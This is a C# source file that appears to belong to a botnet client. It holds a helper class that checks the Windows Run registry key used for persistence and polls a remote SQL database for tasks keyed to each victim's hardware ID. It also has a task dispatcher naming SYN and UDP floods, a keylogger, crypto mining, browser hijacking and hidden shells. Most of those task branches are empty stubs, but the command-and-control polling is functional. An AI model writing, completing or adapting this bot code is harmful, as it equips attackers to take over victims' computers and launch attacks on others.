using System.Reflection;
using System.Data.SqlClient;
using System;

namespace Bot.Classes
{
    internal class Misc
    {
        public static string getFileLocation()
        {
            string loc = Assembly.GetExecutingAssembly().Location;
            if (loc == "" || loc == null)
            {
                loc = Assembly.GetEntryAssembly().Location;
            }
            return loc;
        }

        public static bool getKey(string key)
        {
            bool exists = false;
            Microsoft.Win32.RegistryKey reg = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", false);
            foreach (string r in reg.GetValueNames())
            {
                if (r == key)
                    exists = true;
            }
            return exists;
        }

        public static DateTime getDate()
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                DateTime date = new DateTime();
                try
                {
                    using (SqlCommand cmd = new SqlCommand("SELECT CONVERT(datetime,GETDATE())", conn))
                    {
                        date = Convert.ToDateTime(cmd.ExecuteScalar());
                    }
                }
                catch { }
                return date;
            }
        }

        public static void Task(string type)
        {
            switch (type)
            {
                case "clipboard":
                    Console.WriteLine("Clipboard");
                    break;
                case "http":

                    break;
                case "syn":

                    break;
                case "udp":

                    break;
                case "download":

                    break;
                case "firefox":

                    break;
                case "homepage":

                    break;
                case "keylogger":

                    break;
                case "mine":

                    break;
                case "cleanse":

                    break;
                case "update":

                    break;
                case "uninstall":

                    break;
                case "viewhidden":

                    break;
                case "viewvisable":

                    break;
                case "shellhidden":

                    break;
                case "shellvisable":

                    break;
                default:

                    break;
            }
        }

        public static int getCTask()
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                int CTask = 0;
                try
                {
                    using (SqlCommand cmd = new SqlCommand("SELECT CTask from bots where HWID = @HWID;", conn))
                    {
                        cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                        CTask = Convert.ToInt32(cmd.ExecuteScalar());
                    }
                }
                catch { }
                return CTask;
            }
        }

        public static int getTaskID()
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                int TaskID = 0;
                    using (SqlCommand cmd = new SqlCommand("SELECT TaskID from Tasks where HWID = @HWID;", conn))
                    {
                        cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                        TaskID = Convert.ToInt32(cmd.ExecuteScalar());
                    }
                return TaskID;
            }
        }

        public static string getTask()
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                string Type = "";
                using (SqlCommand cmd = new SqlCommand("SELECT Type from Tasks where HWID = @HWID;", conn))
                {
                    cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                    cmd.Parameters.AddWithValue("TaskID", getTaskID());
                    Type = cmd.ExecuteScalar().ToString();
                }
                return Type;
            }
        }

        public static bool Registered()
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                using (SqlCommand cmd = new SqlCommand("SELECT count(*) FROM Bots WHERE HWID = @HWID ", conn))
                {
                    cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                    if((int)cmd.ExecuteScalar() > 0)
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
            }
        }
    }
}